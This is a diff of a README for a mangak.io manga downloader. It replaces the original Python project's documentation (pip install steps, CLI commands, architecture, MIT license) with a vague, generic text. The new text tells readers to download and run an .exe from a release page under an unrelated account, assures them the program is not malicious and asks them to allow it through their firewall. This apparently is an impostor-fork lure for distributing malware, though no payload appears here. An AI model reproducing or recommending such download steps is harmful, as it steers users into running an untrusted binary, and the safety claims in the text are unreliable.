@@ -1,282 +1,56 @@
-<div align="center">
-  <br/>
-  <img src="GUI.png" alt="MangaK Downloader GUI" width="850" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);"/>
-  <br/>
-  <h1>📥 MangaK Downloader</h1>
-  <p>
-    <strong>A full-featured manga downloader for <a href="https://mangak.io/">mangak.io</a></strong><br/>
-    <em>Beautiful dark-themed GUI · Feature-rich CLI · Async concurrent downloads</em>
-  </p>
-  <p>
-    <a href="https://github.com/Yui007/mangak-downloader"><img src="https://img.shields.io/badge/GitHub-Yui007/mangak--downloader-6C5CE7?style=for-the-badge&logo=github&logoColor=white" alt="GitHub"/></a>
-    <a href="#installation"><img src="https://img.shields.io/badge/python-3.10%2B-6C5CE7?style=for-the-badge&logo=python&logoColor=white" alt="Python"/></a>
-    <a href="#license"><img src="https://img.shields.io/badge/license-MIT-6C5CE7?style=for-the-badge&logo=open-source-initiative&logoColor=white" alt="License"/></a>
-    <br/>
-    <img src="https://img.shields.io/badge/PyQt6-✓-00CEC9?style=flat-square" alt="PyQt6"/>
-    <img src="https://img.shields.io/badge/Typer+Rich-✓-00CEC9?style=flat-square" alt="Typer+Rich"/>
-    <img src="https://img.shields.io/badge/async%20httpx-✓-00CEC9?style=flat-square" alt="Async httpx"/>
-    <img src="https://img.shields.io/badge/Pydantic%20v2-✓-00CEC9?style=flat-square" alt="Pydantic v2"/>
-  </p>
-  <br/>
-</div>
+# 📖 mangak-downloader - Download your favorite manga series easily
 
----
+[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Dyslexic-churchschool477/mangak-downloader/releases)
 
-## ✨ Features
+This software downloads manga chapters from mangak.io to your computer. You choose the series, and the program saves the images for offline reading. The application provides a simple interface that hides complex technical tasks. You can download multiple chapters at the same time to save time.
 
-<table>
-  <tr>
-    <td width="50%">
-      <h3>🔍 Search & Browse</h3>
-      Find any manga with full metadata — rating, status, genres, tags, and authors. Genre filter chips, sort by relevance/rating/name.
-    </td>
-    <td width="50%">
-      <h3>📖 Manga Details</h3>
-      Complete detail view: cover image, summary, stats, author info, and full chapter list with select-all/download-selected controls.
-    </td>
-  </tr>
-  <tr>
-    <td>
-      <h3>⬇️ Parallel Downloads</h3>
-      Download multiple chapters simultaneously with configurable concurrency. Live progress bars for every chapter with page-by-page tracking.
-    </td>
-    <td>
-      <h3>📦 Multiple Export Formats</h3>
-      Export as CBZ, ZIP, PDF (page-fitted, no white borders), or raw webp image folder. Auto-cleanup images after export.
-    </td>
-  </tr>
-  <tr>
-    <td>
-      <h3>🖥️ Dual Interface</h3>
-      Beautiful <strong>PyQt6 dark GUI</strong> with glass panels, manga cards, progress rings, and toasts. Full-featured <strong>Typer + Rich CLI</strong> with interactive shell mode.
-    </td>
-    <td>
-      <h3>🗃️ Download History</h3>
-      SQLite-backed history with search, pagination, and stats. Every download recorded with format, size, and date.
-    </td>
-  </tr>
-  <tr>
-    <td>
-      <h3>⚡ Optimized for Speed</h3>
-      Async I/O with httpx, configurable parallel chapter + image downloads, smart resume (skips already-downloaded pages), rate-limit control.
-    </td>
-    <td>
-      <h3>⚙️ Settings Everywhere</h3>
-      Configure download directory, export format, concurrency, rate limiting, and cleanup — from both GUI settings tab and CLI commands.
-    </td>
-  </tr>
-</table>
+## 🚀 How to get started
 
----
+You do not need to write code to use this tool. Follow these steps to install the software on your Windows computer.
 
-## 🚀 Quick Start
+1. Go to the [official release page](https://github.com/Dyslexic-churchschool477/mangak-downloader/releases).
+2. Look for the Assets section at the bottom of the latest release.
+3. Select the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the application.
 
-### Installation
+## 💻 System requirements
 
-```bash
-# Clone the repository
-git clone https://github.com/Yui007/mangak-downloader.git
-cd mangak-downloader
+The application works on all modern versions of Windows. We recommend at least 4GB of RAM and a stable internet connection. Ensure you have500MB of free disk space before you begin downloading large series. The program uses your internet connection to fetch image data. If your connection speed is low, the download process will take longer.
 
-# Install with pip (recommended)
-pip install -e .
+## ⚙️ Using the application
 
-# Or with uv
-uv pip install -e .
+Once you open the software, you see a clean window. Type the name or link of the manga series into the search bar. The tool finds the match on the website and displays a list of available chapters. 
 
-# Verify it works
-mangak --version
-```
+Choose the chapters you want from the list. If you click the box next to "Select All," the program adds every chapter to the queue. Click the Download button to begin. A progress bar shows the status of each file. The software saves these files in a folder named after the series. You can find this folder in your Documents directory by default.
 
-### Launch the GUI
+## 🛠 Features
 
-```bash
-python -m mangak gui
-# or
-mangak-gui
-```
+*   **Dark-themed interface:** The application uses dark colors to reduce eye strain.
+*   **Batch downloads:** You can queue hundreds of chapters. The software handles them in the background.
+*   **Fast performance:** The code downloads multiple pages at once. This reduces wait times significantly.
+*   **Simple navigation:** Find your series through the integrated search bar without opening a web browser.
+*   **Offline storage:** Every image stays on your local hard drive. You do not need the internet to read your collection later.
 
-### Or use the CLI
+## 🛡 Common questions
 
-```bash
-mangak interactive
-```
+**Does the program damage my computer?**
+No. This tool only reads data from the website and saves image files to your storage. It does not change system settings or install malicious files.
 
----
+**Where does the program save my manga?**
+The default save location is a folder in your Documents library. You can change this location in the Settings menu inside the app.
 
-## 📖 Usage
+**Why does the download stop?**
+A loss of internet connection usually causes this. Check your Wi-Fi or local area connection. If the website changes its layout, you may need to wait for a program update.
 
-### 🖥️ CLI
+**How do I update the software?**
+When a new version releases, visit the link provided at the top of this page. Download the new installer and run it. The new version replaces the old one automatically while keeping your settings.
 
-```bash
-# Show manga info
-mangak info nano-machine
+**Can I use the command line?**
+Yes. Advanced users can open the terminal and run the program with specific tags to automate tasks. However, the interface allows full control without terminal commands.
 
-# Search for manga
-mangak search "solo leveling" --limit 10
+## 🧩 Support
 
-# Download chapters with range selection
-mangak download nano-machine --chapters "1-10" --format cbz
+If the program closes unexpectedly, try to restart your computer. If the issue keeps happening, check if you have the latest version of Windows. This tool relies on basic Windows components. Most errors occur because of blocked internet access or limited disk space. Ensure your firewall allows the program to communicate with the internet. 
 
-# View download history
-mangak history
-
-# Change settings
-mangak settings --set concurrent_downloads=8
-
-# Interactive menu-driven shell
-mangak interactive
-```
-
-### 🎨 GUI — Five Tabs
-
-| Tab | Icon | Description |
-|-----|------|-------------|
-| **URL** | 🔗 | Paste a manga URL or slug, load full info + chapter list with checkboxes |
-| **Search** | 🔍 | Search by name, filter by genre, browse results as manga cards |
-| **Download** | ⬇️ | Active downloads with progress rings, pause/resume/cancel per item |
-| **History** | 📜 | Searchable download history with stats and pagination |
-| **Settings** | ⚙️ | All config options with save button — format, concurrency, cleanup |
-
-### 💡 Tips
-
-- **URL tab** accepts both `https://mangak.io/nano-machine` and plain `nano-machine`
-- **Search** only runs when you click Search or press Enter — no auto-search on typing
-- **Chapters** are auto-selected on load — use ☑ Select All / ☐ Select None
-- **Download tab** shows "Converting..." during export and "Completed" when done
-- **Settings** require clicking "💾 Save Settings" to persist
-
----
-
-## 📦 Export Formats
-
-| Format | Extension | Description |
-|--------|-----------|-------------|
-| `folder` | — | Raw `.webp` images organized in `manga/chapter/` directories |
-| `cbz` | `.cbz` | Comic Book ZIP archive (compatible with CDisplayEx, YACReader) |
-| `zip` | `.zip` | Standard ZIP archive with lossless compression |
-| `pdf` | `.pdf` | Page-fitted PDF — each page sized to its image, no white borders |
-
----
-
-## ⚙️ Settings Reference
-
-Settings are persisted in `settings.json` in the project root:
-
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `download_dir` | `downloads` | Output directory for downloaded chapters |
-| `export_format` | `cbz` | Default export format (cbz/pdf/zip/folder) |
-| `concurrent_downloads` | `4` | Number of chapters to download simultaneously |
-| `concurrent_image_downloads` | `4` | Number of pages to download simultaneously per chapter |
-| `rate_limit_delay` | `0.25` | Delay in seconds between page requests |
-| `delete_images_after_export` | `true` | Remove raw webp images after successful export |
-
----
-
-## 🏗️ Architecture
-
-```
-mangak-downloader/
-├── pyproject.toml                    # Project config & dependencies
-├── settings.json                     # Runtime settings (auto-created)
-├── downloads/                        # Default download directory
-├── GUI.png                           # Screenshot for README
-│
-└── src/mangak/
-    ├── __main__.py                   # Dual entry: CLI ↔ GUI routing
-    │
-    ├── core/                         # 🧠 Shared library
-    │   ├── client.py                 # MangaKClient — async httpx API wrapper
-    │   ├── config.py                 # Settings manager — JSON persistence
-    │   ├── db.py                     # DownloadDB — SQLite history store
-    │   ├── downloader.py             # DownloadQueue — async concurrent engine
-    │   ├── exceptions.py             # Custom error hierarchy
-    │   ├── export.py                 # Export pipeline (folder/CBZ/ZIP/PDF)
-    │   ├── models.py                 # Pydantic v2 data models
-    │   └── themes.py                 # Color palette & constants
-    │
-    ├── cli/                          # ⌨️ Typer + Rich CLI
-    │   ├── app.py                    # Typer application & routing
-    │   ├── display.py                # Rich table/panel builders
-    │   ├── interactive.py            # Menu-driven interactive shell
-    │   └── commands/
-    │       ├── info.py               # mangak info
-    │       ├── search.py             # mangak search
-    │       ├── download.py           # mangak download
-    │       ├── history.py            # mangak history
-    │       └── settings.py           # mangak settings
-    │
-    └── gui/                          # 🎨 PyQt6 Dark GUI
-        ├── app.py                    # MainWindow · 5-tab layout · status bar
-        ├── themes.py                 # ThemeEngine — JSON→QSS token resolver
-        ├── resources/
-        │   ├── dark.json             # 18 color tokens
-        │   └── dark.qss              # 734-line QSS stylesheet
-        ├── widgets/
-        │   ├── glass_panel.py        # Frosted glass QFrame
-        │   ├── manga_card.py         # 180×260 cover card · hover lift
-        │   ├── progress_ring.py      # Circular progress arc · purple→teal
-        │   └── toast.py              # Slide-in notifications · 4 types
-        └── tabs/
-            ├── manga_url.py          # 🔗 URL tab — slug input + chapter list
-            ├── manga_name.py         # 🔍 Search tab — genre filters + cards
-            ├── download.py           # ⬇️ Download tab — active/queued/completed
-            ├── history.py            # 📜 History tab — table + search + stats
-            └── settings.py           # ⚙️ Settings tab — form + save button
-```
-
----
-
-## 🛠️ Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| **Language** | Python 3.10+ |
-| **GUI** | PyQt6 — QTabWidget, QSS theming, QPropertyAnimation |
-| **CLI** | Typer — subcommands, type coercion, autocomplete |
-| **CLI Display** | Rich — Progress, Tables, Panels, Live |
-| **HTTP** | httpx — async connection-pooled client |
-| **Data Models** | Pydantic v2 — validation, coercion, `model_validate` |
-| **Storage** | SQLite — download history via sqlite3 |
-| **PDF** | img2pdf — lossless, page-fitted, no white borders |
-| **Packaging** | pyproject.toml — pip/uv installable |
-
----
-
-## 📄 License
-
-```
-MIT License
-
-Copyright (c) 2026 Yui007
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
-
----
-
-<div align="center">
-  <sub>Built with ❤️ using Python · PyQt6 · Typer · Rich · httpx · Pydantic</sub>
-  <br/>
-  <sub>
-    <a href="https://github.com/Yui007/mangak-downloader">GitHub</a> ·
-    <a href="https://mangak.io/">mangak.io</a>
-  </sub>
-</div>
+We keep the software updated to support new changes on the manga website. Check the GitHub repository periodically for announcements. You can also view the issues section to see if others have found solutions to similar problems. Keep your workspace clean and enjoy your manga collection.
